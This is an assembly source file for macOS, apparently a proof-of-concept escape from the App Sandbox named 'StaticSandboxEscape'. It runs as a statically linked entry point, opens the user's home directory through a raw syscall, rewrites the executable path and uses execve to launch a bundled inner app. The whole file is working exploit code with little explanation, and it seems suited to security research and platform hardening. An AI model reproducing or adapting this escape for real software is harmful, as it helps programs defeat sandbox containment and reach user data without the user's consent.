//
//  main.s
//  StaticSandboxEscape
//
//  Created by Saagar Jha on 3/20/20.
//  Copyright © 2020 Saagar Jha. All rights reserved.
//

#include <sys/syscall.h>

#define UNIX_SYSCALL 2 << 24

.intel_syntax noprefix

.text
.globl start
start:
# Skip argc and argv
1:
	add rsp, 8
	cmp QWORD PTR [rsp], 0
	jne 1b
	add rsp, 8 # skip NULL between argv and argc
# Find envp entry for user
1:
	mov rax, QWORD PTR [rsp]
	cmp BYTE PTR [rax + 0], 'U'
	jne 2f
	cmp BYTE PTR [rax + 1], 'S'
	jne 2f
	cmp BYTE PTR [rax + 2], 'E'
	jne 2f
	cmp BYTE PTR [rax + 3], 'R'
	je 3f
2:
	add rsp, 8
	jmp 1b
3:
	mov rbp, [rsp]
# Make space for /Users/ by shifting the entry over by 2
	mov rdx, rbp
	mov rcx, 2
1:
	mov rbp, rdx
	mov al, BYTE PTR [rbp]
2:
	inc rbp
	mov bl, BYTE PTR [rbp]
	test al, al
	je 2f
	mov BYTE PTR [rbp], al
	mov al, bl
	jmp 2b
2:
	mov BYTE PTR [rbp], 0
	loop 1b
	mov rbp, rdx
# Write /Users/ to the space we created
	mov BYTE PTR [rbp + 0], '/'
	mov BYTE PTR [rbp + 1], 'U'
	mov BYTE PTR [rbp + 2], 's'
	mov BYTE PTR [rbp + 3], 'e'
	mov BYTE PTR [rbp + 4], 'r'
	mov BYTE PTR [rbp + 5], 's'
	mov BYTE PTR [rbp + 6], '/'
# Open directory
	mov rax, SYS_open | UNIX_SYSCALL
	mov rdi, rbp
	xor rsi, rsi
	syscall
# Skip rest of envp
1:
	add rsp, 8
	cmp QWORD PTR [rsp], 0
	jne 1b
# Find envp entry for executable_path
	mov rcx, 15 # strlen("executable_path")
1:
	add rsp, 8
	lea rdi, executable_path[rip] # I have no idea how to make this work
	mov rsi, QWORD PTR [rsp]
	repz cmpsb
	seta al
	sbb al, 0
	test al, al
	jne 1b
# Modify the executable path to the inner binary
	mov rax, QWORD PTR [rsp]
# Find the ".app" part of the path
1:
	cmp BYTE PTR [rax + 0], '.'
	jne 2f
	cmp BYTE PTR [rax + 1], 'a'
	jne 2f
	cmp BYTE PTR [rax + 2], 'p'
	jne 2f
	cmp BYTE PTR [rax + 3], 'p'
	je 3f
2:
	inc rax
	jmp 1b
3:
	add rax, 4
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 0]
	movups XMMWORD PTR[rax + 0], xmm0
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 16]
	movups XMMWORD PTR[rax + 16], xmm0
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 32]
	movups XMMWORD PTR[rax + 32], xmm0
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 48]
	movups XMMWORD PTR[rax + 48], xmm0
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 64]
	movups XMMWORD PTR[rax + 64], xmm0
	movdqa xmm0, XMMWORD PTR fixed_path[rip + 80]
	movups XMMWORD PTR[rax + 80], xmm0
# Finish fixing up argv for execve
	add QWORD PTR [rsp], 16 # strlen("executable_path=")
	mov QWORD PTR [rsp + 8], 0
# execve inner application
	mov rax, SYS_execve | UNIX_SYSCALL
	mov rdi, QWORD PTR [rsp]
	xor rsi, rsi
	xor rdx, rdx
	syscall
# If we're here, something went wrong.
loop:
	jmp loop

.data
fixed_path:
.asciz "/Contents/SharedSupport/StaticSandboxEscapeInner.app/Contents/MacOS/StaticSandboxEscapeInner"
executable_path:
.ascii "executable_path"
